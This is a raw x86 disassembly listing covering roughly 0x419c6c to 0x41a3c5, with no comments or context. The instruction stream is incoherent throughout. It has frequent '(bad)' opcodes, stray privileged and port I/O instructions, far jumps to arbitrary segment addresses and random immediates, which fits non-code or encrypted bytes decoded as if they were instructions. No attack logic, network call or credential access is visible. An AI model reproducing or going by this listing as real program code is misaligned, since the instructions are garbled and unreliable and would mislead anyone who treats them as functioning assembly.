  419c6c:	sub    ah,cl
  419c6e:	sbb    DWORD PTR [edx+0x2c],esp
  419c71:	arpl   WORD PTR [ecx],ax
  419c73:	inc    esp
  419c74:	xor    esi,DWORD PTR [ebx+0x444499a3]
  419c7a:	daa    
  419c7b:	push   edi
  419c7c:	pop    ebx
  419c7d:	push   ss
  419c7e:	stos   BYTE PTR es:[edi],al
  419c7f:	push   0xa4791c72
  419c84:	push   0x87999c81
  419c89:	(bad)  
  419c8a:	(bad)  
  419c8b:	xor    DWORD PTR [edi+0x3ece9a4f],ebp
  419c91:	xchg   ecx,eax
  419c92:	scas   eax,DWORD PTR es:[edi]
  419c93:	push   edx
  419c94:	dec    ebp
  419c95:	pushf  
  419c96:	and    BYTE PTR [edx],0xe8
  419c99:	sub    eax,DWORD PTR [ebp+0x5b]
  419c9c:	sub    BYTE PTR [edi],al
  419c9e:	xor    DWORD PTR fs:[ebp-0x4a],ecx
  419ca2:	dec    edi
  419ca3:	mov    al,0xe1
  419ca5:	add    BYTE PTR [ebx],al
  419ca7:	sar    BYTE PTR [esi+0x74],cl
  419caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cab:	fst    DWORD PTR [edi-0x39ffe2b1]
  419cb1:	mov    al,BYTE PTR ds:0xf21369d5
  419cb7:	xchg   DWORD PTR [ebx-0x38c345f2],ecx
  419cbd:	loope  0x419ce5
  419cbf:	jp     0x419cc4
  419cc1:	pop    esi
  419cc2:	adc    bl,ah
  419cc4:	push   ds
  419cc5:	xor    eax,0x4a415a5f
  419cca:	xchg   DWORD PTR [edi-0x36],ebx
  419ccd:	xchg   DWORD PTR [eax],edx
  419ccf:	les    esi,FWORD PTR [eax-0xb9fcc73]
  419cd5:	jle    0x419d2a
  419cd7:	xchg   esi,eax
  419cd8:	dec    esi
  419cd9:	jmp    0xa486:0x208ca7f4
  419ce0:	dec    si
  419ce2:	mov    dl,0xdf
  419ce4:	or     DWORD PTR ds:0xc470cb7a,ebp
  419cea:	xor    eax,0x5ed24399
  419cef:	sub    ecx,DWORD PTR [edi]
  419cf1:	(bad)  
  419cf2:	retf   0xec83
  419cf5:	xor    ecx,ecx
  419cf7:	pushf  
  419cf8:	sbb    al,0xc5
  419cfa:	push   edx
  419cfb:	adc    edx,edi
  419cfd:	cmc    
  419cfe:	jecxz  0x419d0d
  419d00:	test   ebp,esi
  419d02:	scas   eax,DWORD PTR es:[edi]
  419d03:	sbb    BYTE PTR [eax+0x475f400d],bl
  419d09:	in     eax,0x9e
  419d0b:	xchg   edi,eax
  419d0c:	std    
  419d0d:	jo     0x419d65
  419d0f:	mov    ch,0x49
  419d11:	in     eax,0x98
  419d13:	iret   
  419d14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d15:	(bad)  
  419d16:	aas    
  419d17:	enter  0xab95,0x85
  419d1b:	sbb    edx,ebp
  419d1d:	sbb    eax,0x1e089d67
  419d22:	adc    al,0xf7
  419d24:	shr    ch,cl
  419d26:	pand   mm5,mm7
  419d29:	repnz sbb ch,0x47
  419d2d:	mov    edi,0x72f2ad9b
  419d32:	icebp  
  419d33:	ret    
  419d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d35:	es sbb al,0x6f
  419d38:	adc    ecx,edx
  419d3a:	pop    edi
  419d3b:	lds    eax,FWORD PTR [edx+0xfa81960]
  419d41:	sub    BYTE PTR [edx],cl
  419d43:	mov    ecx,0xad524fd4
  419d48:	div    DWORD PTR [eax+0x75]
  419d4b:	shr    dl,1
  419d4d:	out    dx,eax
  419d4e:	adc    al,0xc5
  419d50:	cmp    BYTE PTR [edx-0x41],cl
  419d53:	xor    edi,edx
  419d55:	pop    edi
  419d56:	es dec ecx
  419d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d59:	add    eax,DWORD PTR [ecx]
  419d5b:	xor    eax,0xa8f5043d
  419d60:	push   0x971132a5
  419d65:	scas   al,BYTE PTR es:[edi]
  419d66:	inc    ebx
  419d67:	ret    
  419d68:	mov    bh,0xcc
  419d6a:	ss repz sbb al,0x8
  419d6e:	test   DWORD PTR [ebx],edi
  419d70:	mov    ecx,0xb60ef6e3
  419d75:	inc    edx
  419d76:	div    bl
  419d78:	mov    dl,0xf5
  419d7a:	stc    
  419d7b:	aam    0x73
  419d7d:	xchg   esi,eax
  419d7e:	pop    edx
  419d7f:	xor    al,0xf7
  419d81:	enter  0xd21e,0x91
  419d85:	ds sbb bh,bl
  419d88:	jmp    DWORD PTR [esi]
  419d8a:	lock lods eax,DWORD PTR ds:[esi]
  419d8c:	imul   esi,DWORD PTR [edi-0x3f],0x2365e8a4
  419d93:	sbb    DWORD PTR [ecx+0x76d48713],0x86099fbb
  419d9d:	fisttp DWORD PTR [esi+0x39]
  419da0:	jle    0x419d8f
  419da2:	loop   0x419d4b
  419da4:	and    DWORD PTR [edx-0x38],ecx
  419da7:	jo     0x419d4c
  419da9:	fcom   QWORD PTR [ecx+0x1f]
  419dac:	shr    BYTE PTR [edx],0x4
  419daf:	push   ebx
  419db0:	ret    
  419db1:	fidiv  DWORD PTR [esi-0x75f77ff8]
  419db7:	sub    BYTE PTR [edx-0x23fa5fab],bl
  419dbd:	and    bh,cl
  419dbf:	fcomp  QWORD PTR [edx+0x5e]
  419dc2:	add    bl,cl
  419dc4:	cmp    al,0x81
  419dc6:	sbb    cl,al
  419dc8:	inc    edx
  419dc9:	inc    edx
  419dca:	ja     0x419de2
  419dcc:	icebp  
  419dcd:	inc    ecx
  419dce:	xchg   ecx,eax
  419dcf:	dec    DWORD PTR [ecx+0x45ff1795]
  419dd5:	add    DWORD PTR [eax+0x1b1958ef],0xffffffb1
  419ddc:	pop    edx
  419ddd:	stos   BYTE PTR es:[edi],al
  419dde:	sti    
  419ddf:	inc    ebx
  419de0:	push   edi
  419de1:	stos   BYTE PTR es:[edi],al
  419de2:	adc    ebp,DWORD PTR [ebx]
  419de4:	dec    ecx
  419de5:	cld    
  419de6:	das    
  419de7:	fisttp WORD PTR [eax]
  419de9:	aad    0xc3
  419deb:	mov    esi,0x45b180fd
  419df0:	aaa    
  419df1:	das    
  419df2:	hlt    
  419df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419df4:	cli    
  419df5:	int3   
  419df6:	add    DWORD PTR [eax-0x2ec5155a],0x5d
  419dfd:	sahf   
  419dfe:	dec    eax
  419dff:	push   eax
  419e00:	mov    ah,0x17
  419e02:	mov    gs,ecx
  419e04:	jb     0x419e72
  419e06:	pop    esi
  419e07:	jnp    0x419df1
  419e09:	mov    BYTE PTR [ecx+0x4a6b225a],dl
  419e0f:	in     eax,dx
  419e10:	in     al,dx
  419e11:	mov    al,ds:0x95cdef6d
  419e16:	int    0x9a
  419e18:	mov    esi,0xb57ff784
  419e1d:	mov    ecx,DWORD PTR [edx]
  419e1f:	mov    edx,DWORD PTR [edi+esi*2]
  419e22:	pop    ebp
  419e23:	xchg   DWORD PTR [edi-0x69],ebp
  419e26:	popf   
  419e27:	cli    
  419e28:	(bad)
  419e2b:	shl    bl,0x34
  419e2e:	or     al,0xe3
  419e30:	jbe    0x419e01
  419e32:	aad    0x57
  419e34:	ds in  al,0xe
  419e37:	dec    ecx
  419e38:	retf   
  419e39:	icebp  
  419e3a:	pop    ss
  419e3b:	(bad)  
  419e3c:	cwde   
  419e3d:	add    BYTE PTR [edx+ecx*8+0x31],dh
  419e41:	ins    DWORD PTR es:[edi],dx
  419e42:	sbb    eax,0x16d0ab4a
  419e47:	popf   
  419e48:	adc    esp,ecx
  419e4a:	ss inc esi
  419e4c:	xor    al,0x14
  419e4e:	fwait
  419e4f:	test   BYTE PTR [ecx],ch
  419e51:	mov    dl,0x3b
  419e53:	dec    ebp
  419e54:	bound  ebp,QWORD PTR [eax-0x7acc0807]
  419e5a:	sub    esi,esi
  419e5c:	sub    al,0xdd
  419e5e:	repz and eax,0x9fe2ea77
  419e64:	repz cmp bl,bh
  419e67:	xor    edx,ebx
  419e69:	push   eax
  419e6a:	mov    edi,0xb352e72
  419e6f:	xchg   esi,eax
  419e70:	lds    edi,FWORD PTR [eax]
  419e72:	outs   dx,DWORD PTR ds:[esi]
  419e73:	mov    al,ds:0xcb4105ef
  419e78:	js     0x419ea0
  419e7a:	or     dl,BYTE PTR [ebp+0x26081ff2]
  419e80:	jns    0x419ed2
  419e82:	sub    al,0xf8
  419e84:	jae    0x419e7c
  419e86:	scas   al,BYTE PTR es:[edi]
  419e87:	repz out dx,al
  419e89:	sub    al,0x81
  419e8b:	outs   dx,DWORD PTR ds:[esi]
  419e8c:	cmp    DWORD PTR [edx+0x127bbadc],ebp
  419e92:	dec    edi
  419e93:	out    dx,eax
  419e94:	arpl   di,di
  419e96:	push   es
  419e97:	stc    
  419e98:	outs   dx,DWORD PTR ds:[esi]
  419e99:	push   eax
  419e9a:	dec    esp
  419e9b:	enter  0x7b26,0x83
  419e9f:	push   cs
  419ea0:	loopne 0x419eb9
  419ea2:	outs   dx,DWORD PTR ds:[esi]
  419ea3:	xor    cl,BYTE PTR [ebp-0xd06ec2c]
  419ea9:	stos   BYTE PTR es:[edi],al
  419eaa:	test   eax,0x37e79a96
  419eaf:	in     al,dx
  419eb0:	xchg   DWORD PTR [eax+0x7ebfc996],ebp
  419eb6:	sbb    DWORD PTR [eax],esi
  419eb8:	aad    0xe8
  419eba:	dec    esp
  419ebb:	pushf  
  419ebc:	add    al,0x1e
  419ebe:	or     al,0xd2
  419ec0:	sub    al,0x16
  419ec2:	lea    esi,[esi-0x77]
  419ec5:	into   
  419ec6:	scas   eax,DWORD PTR es:[edi]
  419ec7:	cmp    eax,0x8b47b250
  419ecc:	jp     0x419ec6
  419ece:	outs   dx,BYTE PTR ds:[esi]
  419ecf:	push   edi
  419ed0:	iret   
  419ed1:	imul   ebp,DWORD PTR [eax+ecx*8-0xc],0x55
  419ed6:	add    ch,BYTE PTR [edi+0x51]
  419ed9:	push   ss
  419eda:	adc    DWORD PTR ds:0x1b7927c9,esi
  419ee0:	aaa    
  419ee1:	inc    edi
  419ee2:	fsubr  QWORD PTR ds:0xae99d49d
  419ee8:	sbb    BYTE PTR [ebx+0x5d],dl
  419eeb:	pop    ebx
  419eec:	sbb    DWORD PTR [ecx*8-0x38adbb4e],0x8634c8bf
  419ef7:	xor    eax,0xf5ad9c29
  419efc:	mov    ecx,0x860a8343
  419f01:	out    0xe3,eax
  419f03:	xor    DWORD PTR [eax-0x12],ecx
  419f06:	stos   DWORD PTR es:[edi],eax
  419f07:	xor    DWORD PTR [ebx+0x1bc9dbbe],edi
  419f0d:	pusha  
  419f0e:	shl    BYTE PTR [eax-0x7dd08324],0x69
  419f15:	cmp    al,0xcb
  419f17:	jne    0x419f4f
  419f19:	or     DWORD PTR [eax],ebp
  419f1b:	inc    edi
  419f1c:	inc    edi
  419f1d:	xlat   BYTE PTR ds:[ebx]
  419f1e:	jbe    0x419f2f
  419f20:	inc    ebp
  419f21:	cld    
  419f22:	inc    ebp
  419f23:	fmul   st(7),st
  419f25:	call   0x886c:0x7a69383e
  419f2c:	loope  0x419fa6
  419f2e:	daa    
  419f2f:	inc    esi
  419f30:	bound  ebx,QWORD PTR [esi+0x3b]
  419f33:	gs leave 
  419f35:	xchg   DWORD PTR [edi+0x6401b7b5],edi
  419f3b:	dec    edx
  419f3c:	cs icebp 
  419f3e:	sbb    dh,BYTE PTR [esi+0x74]
  419f41:	dec    ebp
  419f42:	stc    
  419f43:	mov    ecx,DWORD PTR [esi]
  419f45:	mov    esp,0x8a6b7f67
  419f4a:	cmp    al,0xdb
  419f4c:	gs xor eax,0x46380d18
  419f52:	ins    BYTE PTR es:[edi],dx
  419f53:	cdq    
  419f54:	pop    ebp
  419f55:	add    BYTE PTR [edi-0x295c475e],al
  419f5b:	aam    0xba
  419f5d:	adc    al,0x71
  419f5f:	hlt    
  419f60:	push   ebx
  419f61:	jnp    0x419f6e
  419f63:	aad    0xd9
  419f65:	popa   
  419f66:	test   eax,0xabbf43f1
  419f6b:	inc    esp
  419f6c:	imul   esp,DWORD PTR [ebx+ecx*2],0xffffffe2
  419f70:	mov    dl,0x10
  419f72:	inc    eax
  419f73:	jns    0x419ff2
  419f75:	test   DWORD PTR [ebp+0x65],esp
  419f78:	and    ch,BYTE PTR [ebx-0x5f]
  419f7b:	test   DWORD PTR [ecx-0x12],ecx
  419f7e:	fs ins BYTE PTR es:[edi],dx
  419f80:	and    ecx,esp
  419f82:	adc    al,0x19
  419f84:	dec    esi
  419f85:	inc    edi
  419f86:	jge    0x419f85
  419f88:	ret    0xe54a
  419f8b:	xor    DWORD PTR [ecx-0x43],eax
  419f8e:	adc    dh,BYTE PTR [ecx-0x63d6c984]
  419f94:	in     al,dx
  419f95:	mov    dh,0x3d
  419f97:	shr    DWORD PTR [eax*8+0x32939d1d],cl
  419f9e:	or     DWORD PTR [edx],edi
  419fa0:	gs aam 0x71
  419fa3:	test   al,0x47
  419fa5:	es out dx,eax
  419fa7:	cmp    DWORD PTR [ebx-0x37],esi
  419faa:	mul    DWORD PTR [ebx+0x48]
  419fad:	add    BYTE PTR [ebx-0x6d],dh
  419fb0:	mov    dl,0x45
  419fb2:	addr16 add eax,0x11578d7c
  419fb8:	test   eax,0x2a6d37e4
  419fbd:	xor    ebp,DWORD PTR [eax]
  419fbf:	imul   DWORD PTR ds:0x638ed73a
  419fc5:	push   0xc83cebea
  419fca:	push   ecx
  419fcb:	repz xor eax,0xd55e377
  419fd1:	adc    ebp,eax
  419fd3:	outs   dx,BYTE PTR ds:[esi]
  419fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd5:	cmc    
  419fd6:	dec    edi
  419fd7:	ins    BYTE PTR es:[edi],dx
  419fd8:	shl    DWORD PTR [ebx],cl
  419fda:	mov    edx,0x9c5c4bb5
  419fdf:	mov    bl,0x2b
  419fe1:	rol    DWORD PTR [edx-0x3cc29955],cl
  419fe7:	in     al,dx
  419fe8:	loop   0x419f78
  419fea:	add    DWORD PTR [eax],ebx
  419fec:	pop    ds
  419fed:	mov    ds:0xd6841da6,al
  419ff2:	push   esi
  419ff3:	xchg   esp,eax
  419ff4:	repz cmc 
  419ff6:	int3   
  419ff7:	sub    al,0x21
  419ff9:	inc    esp
  419ffa:	clc    
  419ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ffc:	or     DWORD PTR cs:[ebx+0x44],edi
  41a000:	mov    eax,0xcdc1ad4e
  41a005:	cmp    ebp,DWORD PTR [edi]
  41a007:	rcl    DWORD PTR [eax-0x3e],0x6f
  41a00b:	pop    es
  41a00c:	mov    ds:0xc0e7a14d,eax
  41a011:	jle    0x419fcb
  41a013:	lds    edx,FWORD PTR [esi]
  41a015:	sub    eax,0xa47dc42
  41a01a:	adc    dl,BYTE PTR [eax]
  41a01c:	lahf   
  41a01d:	adc    eax,0x7128db67
  41a022:	popa   
  41a023:	sti    
  41a024:	psrlq  mm4,QWORD PTR fs:[ebx]
  41a028:	add    al,0x5b
  41a02a:	repz dec esp
  41a02c:	jae    0x419fbe
  41a02e:	je     0x41a0a6
  41a030:	add    eax,0xa248d2bc
  41a035:	jg     0x41a08c
  41a037:	jp     0x419fe6
  41a039:	jecxz  0x41a078
  41a03b:	stos   DWORD PTR es:[edi],eax
  41a03c:	pushf  
  41a03d:	popa   
  41a03e:	push   eax
  41a03f:	stos   DWORD PTR es:[edi],eax
  41a040:	daa    
  41a041:	xchg   edx,eax
  41a042:	mov    ebp,edx
  41a044:	mov    ebp,0x890a95da
  41a049:	ror    BYTE PTR [esi+0x76],1
  41a04c:	stos   DWORD PTR es:[edi],eax
  41a04d:	jbe    0x41a079
  41a04f:	xchg   ebp,edi
  41a051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a052:	(bad)  
  41a053:	mov    eax,0x900a0c03
  41a058:	les    ecx,FWORD PTR [edi-0xf]
  41a05b:	sub    BYTE PTR [edi+ebp*2],dh
  41a05e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a05f:	add    BYTE PTR [ecx+0x5a593eba],0xef
  41a066:	xor    DWORD PTR [ebx+ebp*4-0x5f],esp
  41a06a:	mov    cl,cl
  41a06c:	xor    DWORD PTR [eax-0x2f17dd16],0xeba99666
  41a076:	dec    edi
  41a077:	inc    ebx
  41a078:	sub    eax,0x6278bf36
  41a07d:	into   
  41a07e:	stos   BYTE PTR es:[edi],al
  41a07f:	(bad)  
  41a080:	pusha  
  41a081:	cmp    cl,cl
  41a083:	stos   DWORD PTR es:[edi],eax
  41a084:	call   0x42fa:0x5463b2ce
  41a08b:	push   ebx
  41a08c:	aaa    
  41a08d:	fimul  WORD PTR [ebx-0x6bd594c3]
  41a093:	shr    DWORD PTR [ebx+0x8],1
  41a096:	cmp    eax,0xfece3b56
  41a09b:	test   bl,cl
  41a09d:	xchg   ebp,eax
  41a09e:	inc    esi
  41a09f:	jl     0x41a097
  41a0a1:	inc    ebp
  41a0a2:	in     al,0x34
  41a0a4:	dec    esi
  41a0a5:	in     al,0xdb
  41a0a7:	imul   edx,DWORD PTR [ebx-0x40],0xc7d3fb62
  41a0ae:	push   esp
  41a0af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0b0:	push   ebp
  41a0b1:	inc    edi
  41a0b2:	pop    ds
  41a0b3:	lock loopne 0x41a089
  41a0b6:	lods   al,BYTE PTR ds:[esi]
  41a0b7:	jmp    0xab5c480f
  41a0bc:	test   esp,eax
  41a0be:	out    0x7a,al
  41a0c0:	or     ch,bh
  41a0c2:	fist   DWORD PTR [ebx-0x1a15514]
  41a0c8:	pop    esi
  41a0c9:	arpl   WORD PTR [ebx+0xdaecb89],ax
  41a0cf:	(bad)  
  41a0d0:	and    DWORD PTR [esi+0x5ae8989],edi
  41a0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0d7:	lock imul esi,ebp,0x5a
  41a0db:	xchg   esp,eax
  41a0dc:	fisttp DWORD PTR [ebx]
  41a0de:	jmpw   0xb979
  41a0e2:	je     0x41a13e
  41a0e4:	repnz mov ah,0x2
  41a0e7:	cmp    DWORD PTR [eax-0x10],ecx
  41a0ea:	adc    al,0x1d
  41a0ec:	outs   dx,DWORD PTR ds:[esi]
  41a0ed:	(bad)  
  41a0ee:	fdivrp st(1),st
  41a0f0:	fisttp DWORD PTR [ecx]
  41a0f2:	add    BYTE PTR [esi-0x48],bl
  41a0f5:	and    dh,BYTE PTR ds:0x99e86c68
  41a0fb:	inc    esp
  41a0fc:	mov    edx,0x6ef4aad8
  41a101:	sub    eax,0x4b4c6465
  41a106:	jae    0x41a138
  41a108:	dec    esp
  41a109:	fadd   DWORD PTR [edx-0x75b7daff]
  41a10f:	ja     0x41a095
  41a111:	or     edx,DWORD PTR [edi+0x50]
  41a114:	jmp    FWORD PTR fs:0x44c0e4fb
  41a11b:	xchg   ebp,eax
  41a11c:	imul   edi,DWORD PTR [edx+0x48],0x2e8e44bd
  41a123:	adc    DWORD PTR [esi],edi
  41a125:	loop   0x41a0df
  41a127:	out    dx,al
  41a128:	in     eax,dx
  41a129:	lea    edi,[ebx]
  41a12b:	sbb    BYTE PTR [edi],dl
  41a12d:	imul   eax,DWORD PTR [ebx-0x252762d7],0x1
  41a134:	push   esp
  41a135:	cdq    
  41a136:	xor    BYTE PTR [esi+0x61],al
  41a139:	mov    WORD PTR [ebp+edx*4-0x357d6a52],?
  41a140:	adc    BYTE PTR [ebx-0x7d],al
  41a143:	mov    edi,0x7fa091f7
  41a148:	mov    bl,0x45
  41a14a:	out    dx,al
  41a14b:	push   ebp
  41a14c:	xchg   ecx,eax
  41a14d:	outs   dx,BYTE PTR ds:[esi]
  41a14e:	or     BYTE PTR [esi-0xbd83340],ah
  41a154:	xchg   esp,eax
  41a155:	xchg   ebp,eax
  41a156:	leave  
  41a157:	mov    edx,0x8327a11f
  41a15c:	push   eax
  41a15d:	sti    
  41a15e:	test   BYTE PTR [ecx-0x28],0x9d
  41a162:	push   ds
  41a163:	dec    esp
  41a164:	pop    ds
  41a165:	jmp    0x1bb8:0xa0112eed
  41a16c:	mov    al,0x79
  41a16e:	dec    BYTE PTR [esp+esi*4+0x27327836]
  41a175:	fucomip st,st(5)
  41a177:	mov    bh,BYTE PTR [eax+0x7b]
  41a17a:	xchg   DWORD PTR [edi-0x6e],ecx
  41a17d:	popf   
  41a17e:	mov    ch,BYTE PTR [ebp+0x5f50524e]
  41a184:	ins    DWORD PTR es:[edi],dx
  41a185:	(bad)  
  41a186:	pop    edx
  41a187:	adc    dl,ah
  41a189:	sub    DWORD PTR [ebx+0x11],esp
  41a18c:	mov    ebp,0x483cf66e
  41a191:	addr16 pusha 
  41a193:	data16 sub bl,BYTE PTR [ebx]
  41a196:	not    BYTE PTR [ebp-0x33]
  41a199:	add    ch,ch
  41a19b:	jmp    0x72b2:0xd118c724
  41a1a2:	lahf   
  41a1a3:	push   cs
  41a1a4:	mov    DWORD PTR [esi],edi
  41a1a6:	push   ecx
  41a1a7:	mov    ecx,0x5f64ef74
  41a1ac:	jge    0x41a1e9
  41a1ae:	xchg   edx,eax
  41a1af:	dec    edi
  41a1b0:	arpl   WORD PTR [ebx],dx
  41a1b2:	pusha  
  41a1b3:	test   al,0x72
  41a1b5:	(bad)  
  41a1b6:	(bad)
  41a1b9:	scas   eax,DWORD PTR es:[edi]
  41a1ba:	clc    
  41a1bb:	test   al,0x61
  41a1bd:	ds pop ecx
  41a1bf:	daa    
  41a1c0:	push   ds
  41a1c1:	cmp    eax,0x48dc2a3e
  41a1c6:	push   0x6f
  41a1c8:	sub    DWORD PTR [ecx-0x808cd2],0xffffffbf
  41a1cf:	mov    esp,0xeb015e20
  41a1d4:	lahf   
  41a1d5:	(bad)
  41a1da:	fimul  DWORD PTR [edx-0x61418ff]
  41a1e0:	icebp  
  41a1e1:	(bad)  
  41a1e2:	test   eax,0x63a63a8b
  41a1e7:	inc    eax
  41a1e8:	push   ds
  41a1e9:	jbe    0x41a1eb
  41a1eb:	inc    eax
  41a1ec:	ret    0xfe6a
  41a1ef:	mov    BYTE PTR [edx-0xb4ba187],dl
  41a1f5:	xor    ebp,DWORD PTR [ebx]
  41a1f7:	loopne 0x41a1d2
  41a1f9:	test   DWORD PTR [eax],ebp
  41a1fb:	shl    DWORD PTR [edi],cl
  41a1fd:	jge    0x41a1fe
  41a1ff:	or     DWORD PTR [ebp+0x76c15705],ebp
  41a205:	add    al,0x8
  41a207:	jae    0x41a226
  41a209:	or     edx,DWORD PTR [esi]
  41a20b:	popa   
  41a20c:	xchg   edx,eax
  41a20d:	sbb    al,0xbd
  41a20f:	ss and cl,cl
  41a212:	fisubr DWORD PTR [eax]
  41a214:	xchg   esp,eax
  41a215:	jb     0x41a1ab
  41a217:	stc    
  41a218:	hlt    
  41a219:	sub    DWORD PTR [edx+0xa8d6bf1],edx
  41a21f:	or     bl,BYTE PTR ds:0xfedc69b4
  41a225:	cmp    DWORD PTR [edx-0xe],0x5e
  41a229:	mov    ch,0xcf
  41a22b:	add    esi,DWORD PTR [ebx+0x4]
  41a22e:	jp     0x41a218
  41a230:	jle    0x41a1ea
  41a232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a233:	or     BYTE PTR [eax+esi*4],al
  41a236:	and    esi,edx
  41a238:	push   ebx
  41a239:	jge    0x41a1d7
  41a23b:	cmc    
  41a23c:	add    dh,BYTE PTR [eax-0x7aa5ea4c]
  41a242:	jl     0x41a26c
  41a244:	cs inc eax
  41a246:	inc    eax
  41a247:	sub    BYTE PTR [ebx+0x4d],ah
  41a24a:	lods   eax,DWORD PTR ds:[esi]
  41a24b:	mov    bh,0x5c
  41a24d:	xchg   BYTE PTR [ecx+0x4c8b21f9],bl
  41a253:	pop    ecx
  41a254:	jl     0x41a2d0
  41a256:	pop    edi
  41a257:	lea    ebx,[eax-0x3c]
  41a25a:	cmp    DWORD PTR [eax],0x59357dc0
  41a260:	add    BYTE PTR [eax],0xe4
  41a263:	sbb    edx,DWORD PTR [edi+0x219edabd]
  41a269:	scas   eax,DWORD PTR es:[edi]
  41a26a:	stc    
  41a26b:	mov    bl,0xe8
  41a26d:	in     eax,dx
  41a26e:	mov    cl,0xb1
  41a270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a271:	das    
  41a272:	xchg   ebp,eax
  41a273:	push   0xffffffcc
  41a275:	imul   edi,DWORD PTR [edi+0x443aa1c0],0xffffffbe
  41a27c:	scas   al,BYTE PTR es:[edi]
  41a27d:	mov    ch,0x3d
  41a27f:	or     eax,0x95813d7e
  41a284:	aad    0x1b
  41a286:	inc    edi
  41a287:	cmp    ebp,DWORD PTR [edi]
  41a289:	mov    bh,0xf7
  41a28b:	jl     0x41a2a3
  41a28d:	xor    eax,ecx
  41a28f:	or     ch,BYTE PTR [edi]
  41a291:	or     esp,ebx
  41a293:	test   BYTE PTR cs:[edx*8+0xa168753],dh
  41a29b:	xor    eax,0x95303bfa
  41a2a0:	dec    ecx
  41a2a1:	ins    BYTE PTR es:[edi],dx
  41a2a2:	pop    edi
  41a2a3:	out    0x30,eax
  41a2a5:	aam    0xe1
  41a2a7:	repnz jmp 0xe670:0x7e205011
  41a2af:	mov    al,0xcd
  41a2b1:	sub    DWORD PTR [ecx],esi
  41a2b3:	data16 aam 0x69
  41a2b6:	cs dec edx
  41a2b8:	(bad)  
  41a2b9:	bound  eax,QWORD PTR [ecx+0x38ebbf7c]
  41a2bf:	cmp    eax,0xa558bd75
  41a2c4:	mov    bh,0x10
  41a2c6:	shrd   DWORD PTR [ecx],eax,0x23
  41a2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2cb:	pop    esi
  41a2cc:	bound  esp,QWORD PTR [eax-0x61]
  41a2cf:	sbb    al,BYTE PTR [ecx+0x44ca5ebe]
  41a2d5:	call   0x246:0xb0bd0b14
  41a2dc:	nop
  41a2dd:	retf   
  41a2de:	in     al,0xb8
  41a2e0:	xor    al,0x17
  41a2e2:	inc    ecx
  41a2e3:	sub    edx,DWORD PTR [edx]
  41a2e5:	mov    es,ebp
  41a2e7:	and    eax,0x6e8a2f25
  41a2ec:	xor    al,0x52
  41a2ee:	std    
  41a2ef:	push   ds
  41a2f0:	lods   eax,DWORD PTR ds:[esi]
  41a2f1:	push   ebp
  41a2f2:	xor    BYTE PTR [edi-0x2892676f],dl
  41a2f8:	dec    edx
  41a2f9:	outs   dx,BYTE PTR ds:[esi]
  41a2fa:	adc    eax,DWORD PTR ds:0xb488256a
  41a300:	adc    ebp,DWORD PTR [eax]
  41a302:	adc    DWORD PTR [edi-0x45019dfa],ebx
  41a308:	mov    ecx,0xf4301608
  41a30d:	ret    
  41a30e:	jmp    0x41a31a
  41a310:	mov    ebp,ebp
  41a312:	ins    BYTE PTR es:[edi],dx
  41a313:	cld    
  41a314:	jg     0x41a2ef
  41a316:	push   ss
  41a317:	mov    edi,0x558d2708
  41a31c:	cs adc al,0xea
  41a31f:	cmp    BYTE PTR [ebp-0x5a],al
  41a322:	pop    es
  41a323:	and    al,0x46
  41a325:	ret    
  41a326:	cli    
  41a327:	das    
  41a328:	cli    
  41a329:	lea    di,[eax-0x24]
  41a32d:	scas   eax,DWORD PTR es:[edi]
  41a32e:	aas    
  41a32f:	rcl    BYTE PTR fs:[ecx],1
  41a332:	and    ecx,DWORD PTR [edx+ecx*1+0x50]
  41a336:	xchg   ebx,eax
  41a337:	inc    edi
  41a338:	dec    esi
  41a339:	adc    DWORD PTR [ebp+0x52288dde],esp
  41a33f:	sahf   
  41a340:	and    ch,dh
  41a342:	jae    0x41a377
  41a344:	in     al,0xc
  41a346:	cli    
  41a347:	or     BYTE PTR [edi],dl
  41a349:	test   eax,0x5b1fd099
  41a34e:	sub    BYTE PTR [ebp-0x52],0x4b
  41a352:	test   eax,0x65067e0d
  41a357:	jecxz  0x41a34b
  41a359:	mov    ch,0x24
  41a35b:	mov    ah,0xd3
  41a35d:	(bad)  es:[eax]
  41a360:	xchg   ebp,eax
  41a361:	(bad)
  41a365:	sete   dl
  41a368:	rcl    BYTE PTR [ebp-0x3e],1
  41a36b:	iret   
  41a36c:	mov    cs,WORD PTR [eax+0x7]
  41a36f:	(bad)  
  41a370:	int    0x18
  41a372:	add    al,0x23
  41a374:	cmp    DWORD PTR [esi],edx
  41a376:	sbb    BYTE PTR [ebx+0x27c020b0],dl
  41a37c:	loopne 0x41a349
  41a37e:	or     eax,0x148d69e0
  41a383:	cmp    DWORD PTR [edx],ebp
  41a385:	leave  
  41a386:	sahf   
  41a387:	inc    eax
  41a388:	ins    BYTE PTR es:[edi],dx
  41a389:	and    ax,bp
  41a38c:	lock cli 
  41a38e:	and    DWORD PTR [eax+0x3c],0x26be8165
  41a395:	(bad)  
  41a396:	mov    gs,WORD PTR [edx-0x33ce255]
  41a39c:	sub    al,0x69
  41a39e:	outs   dx,BYTE PTR ds:[esi]
  41a39f:	(bad)  
  41a3a0:	pusha  
  41a3a1:	dec    esp
  41a3a2:	push   0x52f52553
  41a3a7:	sbb    ecx,DWORD PTR [esi+0x5df4795b]
  41a3ad:	outs   dx,DWORD PTR ds:[esi]
  41a3ae:	push   edi
  41a3af:	adc    eax,0xc84ffd22
  41a3b4:	fdiv   DWORD PTR [ebx-0x32]
  41a3b7:	jbe    0x41a372
  41a3b9:	xchg   edi,eax
  41a3ba:	sbb    al,BYTE PTR [ecx+0x2e]
  41a3bd:	adc    DWORD PTR [esp+esi*1+0x35],ebp
  41a3c1:	outs   dx,BYTE PTR ds:[esi]
  41a3c2:	pop    esp
  41a3c3:	jg     0x41a37e
  41a3c5:	out    dx,eax
